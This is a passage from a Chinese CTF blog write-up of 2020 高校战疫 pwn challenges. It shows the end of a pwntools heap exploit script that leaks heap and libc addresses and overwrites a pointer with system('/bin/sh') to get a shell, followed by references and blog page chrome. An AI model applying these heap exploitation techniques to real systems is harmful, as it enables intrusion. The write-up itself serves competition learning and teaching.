function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_message_name</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_end_message</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;end message: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_mmap</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_address = <span class="number">0x23333000</span></span><br><span class="line"></span><br><span class="line">name = p64(mmap_address + <span class="number">0x30</span> - <span class="number">0x10</span>)*<span class="number">6</span></span><br><span class="line">message = p64(mmap_address)*<span class="number">6</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your name: &quot;</span>, name)</span><br><span class="line">p.sendafter(<span class="string">&quot;your message: &quot;</span>, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x130</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xe9</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x55555555596E&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xe9</span>)<span class="comment"># overwrite address</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x130</span>)<span class="comment"># first 0x90 chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x130</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x140</span>) <span class="comment">#0x140 chunk1 to small bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xe9</span>) <span class="comment">#0x40 chunk in unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x140 chunk2 in unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xa8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xa8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x150</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">23333</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">heap_address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) + <span class="number">0x100</span></span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xf8</span>) + p64(<span class="number">0xb1</span>) + cyclic(<span class="number">0xa8</span>)</span><br><span class="line">payload += p64(<span class="number">0x91</span>) + p64(heap_address + <span class="number">0x3f0</span>) +p64(mmap_address-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">show_message_name()</span><br><span class="line">p.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">224</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">payload = p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]).ljust(<span class="number">0x30</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(mmap_address + <span class="number">0x48</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">leave_end_message(payload)</span><br><span class="line">call_mmap()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://cloud.tencent.com/developer/article/1608151">高校战“疫”网络安全分享赛-部分PWN题-wp</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/200878">从高校战疫的两道kernel学习kernel</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://bbs.pediy.com/thread-253868.htm">Unicorn 在 Android 的应用</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://b0ldfrev.top/2020/03/10/easy_unicorn/">easy_unicorn基于unicorn的“沙盒逃逸”</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://bbs.pediy.com/thread-259138.htm">unicorn沙箱下的pwn</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.team-su.com/passages/2020-03-10-gxzyCTF/">高校战“疫”网络安全分享赛 2020 SU Write Up</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/213364399.html">https://www.lyyl.online/posts/213364399.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-52.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/2727069109.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-27.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">docker pwn 环境搭建</div></div></a></div><div class="next-post pull-right"><a href="/posts/2569855600.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2019 0CTF/TCTF Quals 部分PWN WriteUp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Babyhacker2"><span class="toc-text">Babyhacker2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easyheap"><span class="toc-text">Easyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-unicorn"><span class="toc-text">Easy_unicorn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unicorn"><span class="toc-text">unicorn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sandbox%E5%88%86%E6%9E%90"><span class="toc-text">Sandbox分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%A8%8B%E5%BA%8F"><span class="toc-text">提取程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xctf-pwn%E5%88%86%E6%9E%90"><span class="toc-text">xctf_pwn分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyVM"><span class="toc-text">EasyVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernoob"><span class="toc-text">Kernoob</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lgd"><span class="toc-text">Lgd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Musl"><span class="toc-text">Musl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shortest-path"><span class="toc-text">Shortest_path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Woodenbox"><span class="toc-text">Woodenbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-4"><span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Twochunk"><span class="toc-text">Twochunk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-7"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-6"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-5"><span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/213364399.html'
    this.page.identifier = 'posts/213364399.html'
    this.page.title = '高校战疫网络安全分享赛 WP'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>